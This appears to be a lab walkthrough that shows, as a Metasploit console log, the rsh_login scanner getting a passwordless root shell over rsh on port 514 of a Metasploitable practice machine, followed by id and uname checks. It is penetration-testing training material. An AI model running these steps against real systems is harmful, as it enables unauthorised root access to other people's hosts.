<pre>514/tcp  open  tcpwrapped</pre>

<pre>msf6 > search rsh_login</pre>

<pre>Matching Modules
================

   #  Name                                   Disclosure Date  Rank    Check  Description
   -  ----                                   ---------------  ----    -----  -----------
   0  auxiliary/scanner/rservices/rsh_login  .                normal  No     rsh Authentication Scanner


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/rservices/rsh_login</pre>

<pre>msf6 > use 0</pre>

<pre>msf6 auxiliary(scanner/rservices/rsh_login) > show options</pre> 

<pre>Module options (auxiliary/scanner/rservices/rsh_login):

   Name              Current Setting                                                 Required  Description
   ----              ---------------                                                 --------  -----------
   ANONYMOUS_LOGIN   false                                                           yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false                                                           no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                               yes       How fast to bruteforce, from 0 to 5
   CreateSession     true                                                            no        Create a new session for every successful login
   DB_ALL_CREDS      false                                                           no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                           no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                           no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                                            no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   ENABLE_STDERR     false                                                           yes       Enables connecting the stderr port
   FROMUSER                                                                          no        The username to login from
   FROMUSER_FILE     /usr/share/metasploit-framework/data/wordlists/rservices_from_  no        File containing from usernames, one per line
                     users.txt
   PASSWORD                                                                          no        A specific password to authenticate with
   PASS_FILE                                                                         no        File containing passwords, one per line
   RHOSTS                                                                            yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             514                                                             yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                                           yes       Stop guessing when a credential works for a host
   THREADS           1                                                               yes       The number of concurrent threads (max one per host)
   USERNAME                                                                          no        A specific username to authenticate as
   USERPASS_FILE                                                                     no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                           no        Try the username as the password for all users
   USER_FILE                                                                         no        File containing usernames, one per line
   VERBOSE           true                                                            yes       Whether to print output for all attempts</pre>


<pre>msf6 auxiliary(scanner/rservices/rsh_login) > set rhosts A.B.C.D</pre>

<pre>msf6 auxiliary(scanner/rservices/rsh_login) > set username root</pre>

<pre>msf6 auxiliary(scanner/rservices/rsh_login) > run</pre>

<pre>[*] A.B.C.D:514   - A.B.C.D:514 - Starting rsh sweep
[*] A.B.C.D:514   - A.B.C.D:514 - Attempting rsh with username 'root' from 'root'
[+] A.B.C.D:514   - A.B.C.D:514, rsh 'root' from 'root' with no password.
[!] A.B.C.D:514   - No active DB -- Credential data will not be saved!
[*] Command shell session 1 opened (0.0.0.0:1023 ->  A.B.C.D:514 ) at 2025-02-05 02:33:42 +0530
[*] A.B.C.D:514   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed</pre>

<pre>msf6 auxiliary(scanner/rservices/rsh_login) > sessions </pre>

<pre>Active sessions
===============

  Id  Name  Type   Information                               Connection
  --  ----  ----   -----------                               ----------
  1         shell  RSH root from root ( A.B.C.D:514)         0.0.0.0:1023 ->  A.B.C.D:514 ( A.B.C.D)</pre>

<pre>msf6 auxiliary(scanner/rservices/rsh_login) > sessions 1</pre>

<pre>[*] Starting interaction with 1...

Shell Banner:
sh: no job control in this shell
sh-3.2#
-----
          
sh-3.2# id
uid=0(root) gid=0(root) groups=0(root)
sh-3.2# uname -r
2.6.24-16-server
sh-3.2# uname
Linux
sh-3.2# uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
sh-3.2# 
</pre>
